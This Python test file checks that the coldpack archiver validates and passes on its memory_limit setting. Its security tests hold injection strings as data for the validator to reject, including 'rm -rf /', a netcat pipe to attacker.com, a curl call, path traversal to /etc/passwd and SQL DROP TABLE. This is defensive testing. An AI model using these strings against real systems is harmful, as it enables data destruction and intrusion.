# SPDX-FileCopyrightText: 2025 coldpack contributors
# SPDX-License-Identifier: MIT

"""End-to-end integration tests for memory_limit parameter functionality.

This module tests the complete flow of memory_limit parameter from CLI input
through archiver processing to final py7zz configuration.
"""

import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from typer.testing import CliRunner

from coldpack.cli import app
from coldpack.config.constants import ExitCodes
from coldpack.config.settings import SevenZipSettings
from coldpack.core.archiver import ColdStorageArchiver


class TestMemoryLimitEndToEndFlow:
    """Test complete memory_limit flow from CLI to compression."""

    @pytest.fixture
    def runner(self):
        """Create CLI test runner."""
        return CliRunner()

    @pytest.fixture
    def temp_source_dir(self):
        """Create temporary source directory with test content."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create test files
            (temp_path / "file1.txt").write_text("test content 1")
            (temp_path / "file2.txt").write_text("test content 2")

            # Create subdirectory
            subdir = temp_path / "subdir"
            subdir.mkdir()
            (subdir / "nested.txt").write_text("nested content")

            yield temp_path

    def test_cli_memory_limit_to_py7zz_config_flow(self, runner, temp_source_dir):
        """Test complete flow: CLI --memory-limit → SevenZipSettings → py7zz config."""
        from coldpack.core.archiver import ArchiveResult

        with (
            patch("coldpack.cli.ColdStorageArchiver") as mock_archiver,
            patch("coldpack.cli.check_par2_availability") as mock_par2_check,
        ):
            # Mock PAR2 as available
            mock_par2_check.return_value = True

            # Mock archiver
            mock_archiver_instance = MagicMock()
            mock_archiver.return_value = mock_archiver_instance

            # Create a successful ArchiveResult
            success_result = ArchiveResult(
                success=True, message="Archive created successfully", created_files=[]
            )
            mock_archiver_instance.create_archive.return_value = success_result

            with tempfile.TemporaryDirectory() as output_dir:
                result = runner.invoke(
                    app,
                    [
                        "create",
                        str(temp_source_dir),
                        "--output-dir",
                        output_dir,
                        "--memory-limit",
                        "2g",
                        "--level",
                        "7",
                        "--dict",
                        "64m",
                        "--threads",
                        "4",
                    ],
                )

                # Should succeed
                assert result.exit_code == 0

                # Verify archiver was initialized with correct settings
                mock_archiver.assert_called_once()
                archiver_call_args = mock_archiver.call_args

                # Extract sevenzip_settings from the call
                sevenzip_settings = None
                if (
                    archiver_call_args[1]
                    and "sevenzip_settings" in archiver_call_args[1]
                ):
                    sevenzip_settings = archiver_call_args[1]["sevenzip_settings"]
                elif len(archiver_call_args[0]) > 1:
                    # positional argument
                    sevenzip_settings = archiver_call_args[0][1]

                # Verify settings contain memory_limit
                assert sevenzip_settings is not None
                assert sevenzip_settings.memory_limit == "2g"
                assert sevenzip_settings.level == 7
                assert sevenzip_settings.dictionary_size == "64m"
                assert sevenzip_settings.threads == 4

                # Verify py7zz config conversion
                py7zz_config = sevenzip_settings.to_py7zz_config()
                assert py7zz_config["memory_limit"] == "2g"
                assert py7zz_config["level"] == 7
                assert py7zz_config["dictionary_size"] == "64m"
                assert py7zz_config["threads"] == 4

    def test_memory_limit_error_propagation_chain(self, runner, temp_source_dir):
        """Test error propagation from CLI validation through archiver."""
        # Test invalid memory_limit format
        result = runner.invoke(
            app, ["create", str(temp_source_dir), "--memory-limit", "invalid_format"]
        )

        # Should fail at CLI validation level
        assert result.exit_code == ExitCodes.INVALID_FORMAT
        assert "memory-limit must be in format" in result.stdout

        # Test exceeding 64GB limit
        result = runner.invoke(
            app, ["create", str(temp_source_dir), "--memory-limit", "100g"]
        )

        # Should fail at CLI validation level
        assert result.exit_code == ExitCodes.INVALID_FORMAT
        assert "memory-limit cannot exceed 64GB" in result.stdout

    @patch("coldpack.utils.sevenzip.py7zz")
    def test_memory_limit_reaches_py7zz_compression(self, mock_py7zz, temp_source_dir):
        """Test that memory_limit actually reaches the py7zz compression layer."""
        # Create archiver with memory_limit
        sevenzip_settings = SevenZipSettings(
            level=6, dictionary_size="16m", threads=2, memory_limit="1g"
        )

        archiver = ColdStorageArchiver(sevenzip_settings=sevenzip_settings)

        with tempfile.TemporaryDirectory() as output_dir:
            archive_dir = Path(output_dir) / "test_archive"
            archive_dir.mkdir()

            with patch(
                "coldpack.utils.filesystem.safe_file_operations"
            ) as mock_safe_ops_ctx:
                mock_safe_ops = MagicMock()
                mock_safe_ops_ctx.return_value.__enter__.return_value = mock_safe_ops

                import contextlib

                with contextlib.suppress(Exception):
                    # Expected to fail due to mocking, but verify py7zz was called correctly
                    archiver._create_7z_archive(
                        temp_source_dir, archive_dir, "test_archive", mock_safe_ops
                    )

                # Verify py7zz.SevenZipFile was called with memory_limit in config
                mock_py7zz.SevenZipFile.assert_called_once()
                call_args = mock_py7zz.SevenZipFile.call_args

                # Extract config from the call
                config = call_args[1]["config"]
                assert hasattr(config, "memory_limit")

    def test_memory_limit_with_optimization_integration(self):
        """Test memory_limit preservation during dynamic optimization."""
        from coldpack.utils.sevenzip import optimize_7z_compression_settings

        # Test that optimize function preserves memory_limit
        source_size = 100 * 1024 * 1024  # 100MB
        memory_limit = "512m"

        optimized_settings = optimize_7z_compression_settings(
            source_size, threads=4, memory_limit=memory_limit
        )

        # Verify memory_limit is preserved
        assert optimized_settings.memory_limit == memory_limit
        # Verify other settings are optimized based on size
        assert optimized_settings.level == 7  # Large file optimization
        assert optimized_settings.dictionary_size == "64m"
        assert optimized_settings.threads == 4

    def test_multiple_memory_limit_formats_end_to_end(self, runner, temp_source_dir):
        """Test various memory_limit formats work end-to-end."""
        from coldpack.core.archiver import ArchiveResult

        test_formats = [
            ("1g", "1g"),
            ("512m", "512m"),
            ("256k", "256k"),
            ("1024", "1024"),
            ("2G", "2G"),  # Case insensitive
            ("64g", "64g"),  # Boundary case
        ]

        with (
            patch("coldpack.cli.ColdStorageArchiver") as mock_archiver,
            patch("coldpack.cli.check_par2_availability") as mock_par2_check,
        ):
            # Mock PAR2 as available
            mock_par2_check.return_value = True

            # Mock archiver
            mock_archiver_instance = MagicMock()
            mock_archiver.return_value = mock_archiver_instance

            # Create a successful ArchiveResult
            success_result = ArchiveResult(
                success=True, message="Archive created successfully", created_files=[]
            )
            mock_archiver_instance.create_archive.return_value = success_result

            for input_format, expected_format in test_formats:
                mock_archiver.reset_mock()

                with tempfile.TemporaryDirectory() as output_dir:
                    result = runner.invoke(
                        app,
                        [
                            "create",
                            str(temp_source_dir),
                            "--output-dir",
                            output_dir,
                            "--memory-limit",
                            input_format,
                        ],
                    )

                    # Should succeed
                    assert result.exit_code == 0, f"Failed for format: {input_format}"

                    # Verify archiver was called with correct memory_limit
                    mock_archiver.assert_called_once()
                    archiver_call_args = mock_archiver.call_args

                    # Extract sevenzip_settings
                    sevenzip_settings = None
                    if (
                        archiver_call_args[1]
                        and "sevenzip_settings" in archiver_call_args[1]
                    ):
                        sevenzip_settings = archiver_call_args[1]["sevenzip_settings"]
                    elif len(archiver_call_args[0]) > 1:
                        sevenzip_settings = archiver_call_args[0][1]

                    assert sevenzip_settings is not None
                    assert (
                        sevenzip_settings.memory_limit.lower()
                        == expected_format.lower()
                    )


class TestMemoryLimitErrorHandling:
    """Test error handling across the memory_limit pipeline."""

    def test_sevenzip_settings_validation_errors(self):
        """Test SevenZipSettings validation catches memory_limit errors."""
        # Test invalid format
        with pytest.raises(ValueError, match="memory_limit must be in format"):
            SevenZipSettings(memory_limit="invalid")

        # Test zero value
        with pytest.raises(ValueError, match="memory_limit must be a positive number"):
            SevenZipSettings(memory_limit="0g")

        # Test exceeding 64GB
        with pytest.raises(ValueError, match="memory_limit cannot exceed 64GB"):
            SevenZipSettings(memory_limit="65g")

    def test_archiver_handles_sevenzip_settings_errors(self):
        """Test that archiver properly handles SevenZipSettings validation errors."""
        # Test that invalid settings are caught before archiver initialization
        with pytest.raises(ValueError):
            invalid_settings = SevenZipSettings(memory_limit="invalid_format")
            ColdStorageArchiver(sevenzip_settings=invalid_settings)

    def test_memory_limit_boundary_conditions(self):
        """Test memory_limit boundary conditions."""
        # Test minimum valid values
        settings = SevenZipSettings(memory_limit="1k")
        assert settings.memory_limit == "1k"

        settings = SevenZipSettings(memory_limit="1m")
        assert settings.memory_limit == "1m"

        settings = SevenZipSettings(memory_limit="1g")
        assert settings.memory_limit == "1g"

        # Test maximum valid value (64GB)
        settings = SevenZipSettings(memory_limit="64g")
        assert settings.memory_limit == "64g"

        # Test just over the limit should fail
        with pytest.raises(ValueError):
            SevenZipSettings(memory_limit="65g")


class TestMemoryLimitMetadataIntegration:
    """Test memory_limit integration with metadata system."""

    def test_memory_limit_in_archive_metadata(self):
        """Test that memory_limit is properly stored in archive metadata."""
        from coldpack.config.settings import ArchiveMetadata

        # Create sevenzip_settings with memory_limit
        sevenzip_settings = SevenZipSettings(
            level=8, dictionary_size="64m", threads=6, memory_limit="3g"
        )

        # Create metadata with memory_limit settings
        metadata = ArchiveMetadata(
            source_path=Path("/test/source"),
            archive_path=Path("/test/archive.7z"),
            archive_name="test_archive",
            sevenzip_settings=sevenzip_settings,
        )

        # Verify memory_limit is preserved in metadata
        assert metadata.sevenzip_settings.memory_limit == "3g"
        assert metadata.sevenzip_settings.level == 8
        assert metadata.sevenzip_settings.dictionary_size == "64m"
        assert metadata.sevenzip_settings.threads == 6

    def test_memory_limit_metadata_serialization(self):
        """Test memory_limit settings can be serialized to/from TOML."""
        from coldpack.config.settings import ArchiveMetadata

        # Create settings with memory_limit
        sevenzip_settings = SevenZipSettings(
            level=9, dictionary_size="256m", threads=8, memory_limit="4g"
        )

        metadata = ArchiveMetadata(
            source_path=Path("/test/source"),
            archive_path=Path("/test/archive.7z"),
            archive_name="test_archive",
            sevenzip_settings=sevenzip_settings,
        )

        with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
            toml_path = Path(f.name)

        try:
            # Save to TOML
            metadata.save_to_toml(toml_path)

            # Load from TOML
            loaded_metadata = ArchiveMetadata.load_from_toml(toml_path)

            # Verify memory_limit is preserved
            assert loaded_metadata.sevenzip_settings.memory_limit == "4g"
            assert loaded_metadata.sevenzip_settings.level == 9
            assert loaded_metadata.sevenzip_settings.dictionary_size == "256m"
            assert loaded_metadata.sevenzip_settings.threads == 8
        finally:
            toml_path.unlink()


class TestMemoryLimitErrorConsistency:
    """Test error handling consistency across memory_limit implementation layers."""

    def test_error_message_consistency_across_layers(self):
        """Test that error messages are consistent across CLI, Archiver, and Settings layers."""
        runner = CliRunner()

        # Test invalid format error consistency
        invalid_format = "invalid_format"

        # CLI layer error
        result = runner.invoke(
            app, ["create", "/tmp", "--memory-limit", invalid_format]
        )
        cli_error_msg = result.stdout

        # Settings layer error
        settings_error_msg = ""
        try:
            SevenZipSettings(memory_limit=invalid_format)
        except ValueError as e:
            settings_error_msg = str(e)

        # Both should mention format requirements
        assert (
            "memory_limit must be in format" in cli_error_msg
            or "memory-limit must be in format" in cli_error_msg
        )
        assert "memory_limit must be in format" in settings_error_msg

        # Test exceeding limit error consistency
        over_limit = "65g"

        # CLI layer error
        result = runner.invoke(app, ["create", "/tmp", "--memory-limit", over_limit])
        cli_error_msg = result.stdout

        # Settings layer error
        settings_error_msg = ""
        try:
            SevenZipSettings(memory_limit=over_limit)
        except ValueError as e:
            settings_error_msg = str(e)

        # Both should mention 64GB limit
        assert "64GB" in cli_error_msg
        assert "64GB" in settings_error_msg

    def test_error_code_consistency(self):
        """Test that error codes are consistent across different failure modes."""
        runner = CliRunner()

        # All memory_limit validation errors should return INVALID_FORMAT
        test_cases = [
            "invalid_format",
            "0g",
            "65g",
            "-1g",
            "1.5g",
            " 1g",
            "1g ",
        ]

        for invalid_input in test_cases:
            result = runner.invoke(
                app, ["create", "/tmp", "--memory-limit", invalid_input]
            )
            assert result.exit_code == ExitCodes.INVALID_FORMAT, (
                f"Failed for input: {invalid_input}"
            )

    def test_exception_chain_propagation(self):
        """Test that exceptions propagate correctly through the call chain."""
        from pydantic import ValidationError

        # Test that SevenZipSettings validation errors propagate to archiver
        with pytest.raises(ValidationError) as exc_info:
            invalid_settings = SevenZipSettings(memory_limit="invalid")
            ColdStorageArchiver(sevenzip_settings=invalid_settings)

        error_message = str(exc_info.value)
        assert "memory_limit must be in format" in error_message

    def test_validation_error_formats(self):
        """Test that validation error formats follow consistent patterns."""
        from pydantic import ValidationError

        validation_errors = [
            ("invalid", "memory_limit must be in format"),
            ("0g", "memory_limit must be a positive number"),
            ("65g", "memory_limit cannot exceed 64GB"),
            (
                "-5m",
                "memory_limit must be in format",
            ),  # Negative values fail format check first
        ]

        for invalid_input, expected_pattern in validation_errors:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=invalid_input)

            error_message = str(exc_info.value)
            assert expected_pattern in error_message, (
                f"Pattern '{expected_pattern}' not found in error message: {error_message}"
            )

    def test_boundary_error_consistency(self):
        """Test that boundary value errors are handled consistently."""
        from pydantic import ValidationError

        # Test zero boundary
        zero_values = ["0", "0k", "0m", "0g"]
        for zero_val in zero_values:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=zero_val)
            error_message = str(exc_info.value)
            assert "memory_limit must be a positive number" in error_message, (
                f"Expected positive number error for {zero_val}"
            )

        # Test upper boundary (just over 64GB)
        over_limit_values = ["65g", "65537m"]  # 65537m = 65.537GB which is over 64GB
        for over_val in over_limit_values:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=over_val)
            error_message = str(exc_info.value)
            assert "memory_limit cannot exceed" in error_message, (
                f"Expected exceed limit error for {over_val}"
            )

        # Test valid boundary values should not raise errors
        valid_boundary_values = ["1k", "1m", "1g", "64g"]
        for valid_val in valid_boundary_values:
            settings = SevenZipSettings(memory_limit=valid_val)
            assert settings.memory_limit == valid_val.lower()

    def test_cli_archiver_error_propagation_chain(self):
        """Test complete error propagation from CLI through archiver to settings."""
        runner = CliRunner()

        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "test.txt").write_text("test content")

            # Test that CLI properly catches and formats archiver/settings errors
            result = runner.invoke(
                app, ["create", str(temp_path), "--memory-limit", "invalid"]
            )

            # Should get CLI validation error, not a raw exception traceback
            assert result.exit_code == ExitCodes.INVALID_FORMAT
            assert "memory-limit must be in format" in result.stdout
            # Should not contain Python traceback
            assert "Traceback" not in result.stdout
            assert "ValueError" not in result.stdout

    def test_error_message_localization_consistency(self):
        """Test that error messages maintain consistent terminology."""
        # All error messages should use consistent parameter naming
        error_sources = []

        # CLI error messages
        runner = CliRunner()
        result = runner.invoke(app, ["create", "/tmp", "--memory-limit", "invalid"])
        error_sources.append(result.stdout)

        # Settings error messages
        try:
            SevenZipSettings(memory_limit="invalid")
        except ValueError as e:
            error_sources.append(str(e))

        # Check terminology consistency
        for error_msg in error_sources:
            # Should consistently refer to the parameter
            assert "memory" in error_msg.lower()
            # Should use consistent format description
            if "format" in error_msg.lower():
                assert any(unit in error_msg for unit in ["g", "m", "k"])

    def test_error_recovery_and_fallback_consistency(self):
        """Test that error recovery mechanisms work consistently."""
        import contextlib

        # Test that invalid memory_limit doesn't break the entire settings object
        with contextlib.suppress(ValueError):
            SevenZipSettings(level=5, dictionary_size="16m", memory_limit="invalid")

        # Valid settings should still work normally
        valid_settings = SevenZipSettings(
            level=5, dictionary_size="16m", memory_limit="1g"
        )
        assert valid_settings.level == 5
        assert valid_settings.dictionary_size == "16m"
        assert valid_settings.memory_limit == "1g"


class TestMemoryLimitResourceConflictsAndSecurity:
    """Test resource conflicts and security aspects of memory_limit functionality."""

    def test_memory_limit_with_conflicting_parameters(self):
        """Test memory_limit interactions with other compression parameters."""
        # Test memory_limit with very small dictionary size
        settings = SevenZipSettings(
            level=9, dictionary_size="128k", memory_limit="4g", threads=16
        )
        # Should be allowed - no explicit conflicts enforced
        assert settings.memory_limit == "4g"
        assert settings.dictionary_size == "128k"

        # Test memory_limit with maximum dictionary size
        settings = SevenZipSettings(
            level=9, dictionary_size="512m", memory_limit="1g", threads=1
        )
        # Should be allowed - user responsibility to ensure compatibility
        assert settings.memory_limit == "1g"
        assert settings.dictionary_size == "512m"

    def test_memory_limit_threads_interaction(self):
        """Test memory_limit behavior with different thread configurations."""
        # Test with single thread
        settings = SevenZipSettings(memory_limit="512m", threads=False)
        assert settings.memory_limit == "512m"
        assert settings.threads is False

        # Test with all threads
        settings = SevenZipSettings(memory_limit="2g", threads=True)
        assert settings.memory_limit == "2g"
        assert settings.threads is True

        # Test with specific thread count
        settings = SevenZipSettings(memory_limit="4g", threads=8)
        assert settings.memory_limit == "4g"
        assert settings.threads == 8

    def test_malicious_memory_limit_inputs(self):
        """Test protection against malicious memory_limit inputs."""
        from pydantic import ValidationError

        malicious_inputs = [
            # Script injection attempts
            "1g; rm -rf /",
            "1g && curl malicious.com",
            "1g | nc attacker.com 1234",
            # Path traversal attempts
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            # Buffer overflow attempts
            "A" * 10000,
            # Format string attacks
            "%s%s%s%s",
            # Command injection
            "`whoami`",
            "$(ls -la)",
            # SQL injection style
            "1g'; DROP TABLE users; --",
            # Unicode/encoding attacks
            "\u202e1g",  # Right-to-left override
            "\x00\x01\x02",  # Null bytes and control chars
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=malicious_input)

            # Should fail validation, not cause system issues
            error_message = str(exc_info.value)
            assert "memory_limit must be in format" in error_message

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        from pydantic import ValidationError

        # Test extremely large values that could cause system issues
        exhaustion_attempts = [
            "999999999999g",  # Extremely large GB value
            "18446744073709551615",  # Near max uint64 in bytes
            "999999999999999999999999999999g",  # Ridiculously large value
        ]

        for exhaustion_attempt in exhaustion_attempts:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=exhaustion_attempt)

            error_message = str(exc_info.value)
            # Should be caught by size validation
            assert any(
                phrase in error_message
                for phrase in [
                    "memory_limit cannot exceed",
                    "memory_limit must be in format",
                ]
            )

    def test_input_sanitization_and_normalization(self):
        """Test that memory_limit inputs are properly sanitized and normalized."""
        # Test case normalization
        test_cases = [
            ("1G", "1g"),
            ("512M", "512m"),
            ("256K", "256k"),
            ("1024", "1024"),
        ]

        for input_val, expected_val in test_cases:
            settings = SevenZipSettings(memory_limit=input_val)
            assert settings.memory_limit == expected_val

        # Test whitespace handling (should fail - but some might pass due to string.strip())
        from pydantic import ValidationError

        whitespace_cases = [" 1g ", "\t1g\t", "1g\n", "\n1g\n"]

        for whitespace_case in whitespace_cases:
            try:
                # Some whitespace might be automatically stripped by Pydantic
                settings = SevenZipSettings(memory_limit=whitespace_case)
                # If it passes, ensure it's properly normalized (may include whitespace that wasn't stripped)
                assert settings.memory_limit.strip() == "1g", (
                    f"Expected '1g' but got '{settings.memory_limit}'"
                )
            except ValidationError:
                # This is also acceptable - strict validation
                pass

    def test_concurrent_memory_usage_scenarios(self):
        """Test memory_limit behavior in concurrent usage scenarios."""
        # Simulate multiple archiver instances with different memory limits
        archivers = []
        memory_limits = ["256m", "512m", "1g", "2g"]

        for memory_limit in memory_limits:
            settings = SevenZipSettings(memory_limit=memory_limit)
            archiver = ColdStorageArchiver(sevenzip_settings=settings)
            archivers.append(archiver)

            # Verify each archiver has its own memory limit
            assert archiver.sevenzip_settings.memory_limit == memory_limit

        # Verify no cross-contamination between instances
        for i, archiver in enumerate(archivers):
            assert archiver.sevenzip_settings.memory_limit == memory_limits[i]

    def test_memory_limit_boundary_security(self):
        """Test security aspects of memory_limit boundary values."""
        from pydantic import ValidationError

        # Test integer overflow scenarios - focus on values that actually exceed our limits
        overflow_tests = [
            # Values that exceed our 64GB limit
            "68719476737",  # 64GB + 1 byte
            "137438953472",  # 128GB in bytes
        ]

        for overflow_test in overflow_tests:
            with pytest.raises(ValidationError) as exc_info:
                SevenZipSettings(memory_limit=overflow_test)

            error_message = str(exc_info.value)
            assert "memory_limit cannot exceed" in error_message

        # Test very large numbers that should fail format validation
        format_fail_tests = [
            "999999999999999999999999999999g",  # Ridiculously large number
            "18446744073709551616",  # 2^64 bytes (too large for our validation)
        ]

        for format_fail_test in format_fail_tests:
            with pytest.raises(ValidationError):
                SevenZipSettings(memory_limit=format_fail_test)

    def test_memory_limit_with_system_resource_awareness(self):
        """Test memory_limit behavior with system resource considerations."""
        # Test that reasonable values within limits are accepted
        reasonable_limits = ["128m", "256m", "512m", "1g", "2g", "4g", "8g"]

        for limit in reasonable_limits:
            settings = SevenZipSettings(memory_limit=limit)
            assert settings.memory_limit == limit

            # Verify py7zz config conversion works
            config = settings.to_py7zz_config()
            assert config["memory_limit"] == limit

    def test_memory_limit_injection_via_optimization(self):
        """Test that memory_limit cannot be manipulated through optimization process."""
        from coldpack.utils.sevenzip import optimize_7z_compression_settings

        # Test that optimization preserves memory_limit without manipulation
        original_memory_limit = "1g"
        source_size = 100 * 1024 * 1024  # 100MB

        optimized_settings = optimize_7z_compression_settings(
            source_size, threads=4, memory_limit=original_memory_limit
        )

        # Memory limit should be preserved exactly
        assert optimized_settings.memory_limit == original_memory_limit

        # Other settings may be optimized, but memory_limit should be untouched
        config = optimized_settings.to_py7zz_config()
        assert config["memory_limit"] == original_memory_limit

    def test_memory_limit_metadata_security(self):
        """Test security of memory_limit in metadata serialization."""
        from coldpack.config.settings import ArchiveMetadata

        # Test that memory_limit is safely serialized/deserialized
        settings = SevenZipSettings(
            level=7, dictionary_size="64m", threads=4, memory_limit="2g"
        )

        metadata = ArchiveMetadata(
            source_path=Path("/test/source"),
            archive_path=Path("/test/archive.7z"),
            archive_name="test_archive",
            sevenzip_settings=settings,
        )

        # Serialize to TOML
        toml_dict = metadata.to_toml_dict()

        # Memory limit should be safely included
        assert "memory_limit" in toml_dict["sevenzip"]
        assert toml_dict["sevenzip"]["memory_limit"] == "2g"

        # Test deserialization security
        with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
            toml_path = Path(f.name)

        try:
            metadata.save_to_toml(toml_path)
            loaded_metadata = ArchiveMetadata.load_from_toml(toml_path)

            # Memory limit should be preserved exactly
            assert loaded_metadata.sevenzip_settings.memory_limit == "2g"

            # Should not allow injection through metadata files
            assert loaded_metadata.sevenzip_settings.level == 7
            assert loaded_metadata.sevenzip_settings.dictionary_size == "64m"
        finally:
            toml_path.unlink()

    def test_memory_limit_cli_security(self):
        """Test CLI security aspects of memory_limit parameter."""
        runner = CliRunner()

        # Test that CLI properly sanitizes memory_limit input
        security_test_cases = [
            # Should all fail at validation stage
            ("--memory-limit", "1g; echo 'hacked'"),
            ("--memory-limit", "$(whoami)"),
            ("--memory-limit", "`id`"),
            ("--memory-limit", "1g && rm -rf /"),
        ]

        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "test.txt").write_text("test content")

            for option, malicious_value in security_test_cases:
                result = runner.invoke(
                    app, ["create", str(temp_path), option, malicious_value]
                )

                # Should fail at validation, not execute anything malicious
                assert result.exit_code == ExitCodes.INVALID_FORMAT
                assert "memory-limit must be in format" in result.stdout
                # Should not contain any shell execution results
                assert "hacked" not in result.stdout
                assert "root" not in result.stdout


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
